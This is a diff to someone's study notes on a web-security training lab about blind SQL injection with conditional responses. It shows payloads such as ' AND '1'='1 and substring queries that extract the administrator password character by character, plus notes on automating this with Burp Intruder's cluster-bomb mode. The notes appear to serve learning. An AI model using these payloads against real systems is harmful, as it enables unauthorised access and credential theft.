@@ -1,4 +1,4 @@
-Lab #11: 
+Lab #11: Blind SQL injection with conditional responses
 
  Verify that the "Welcome back" message appears in the response. 
 ' AND '1'='1
@@ -27,7 +27,12 @@ The first letter is 1
 Change the starting point to 2
 ' and (select substring(password,2,1) from users where username ='administrator')='§a§
 
-The secont character is c
+We can also use burp cluster bomp intruder attacker, where we can set two payload one at the starting character and another at 
+the password character field.
+' and (select substring(password,§3§,1) from users where username ='administrator')='§a§
+
+
+The second character is c
 1cs
 
 
